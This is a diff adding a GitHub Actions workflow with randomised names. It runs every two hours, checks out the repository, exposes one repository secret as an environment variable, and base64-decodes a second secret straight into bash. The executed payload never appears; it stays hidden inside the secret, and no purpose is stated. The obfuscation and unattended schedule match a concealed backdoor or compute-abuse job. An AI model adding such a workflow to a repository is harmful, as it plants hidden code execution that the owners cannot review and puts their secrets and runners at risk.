@@ -1,0 +1,13 @@
+name: otvxrg
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  WGoawskuT:
+    runs-on: ubuntu-24.04
+    env:
+      obIGBYv: ${{ secrets.cbHVVQAYrq }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.uLPwYtF }}" | base64 -d | bash
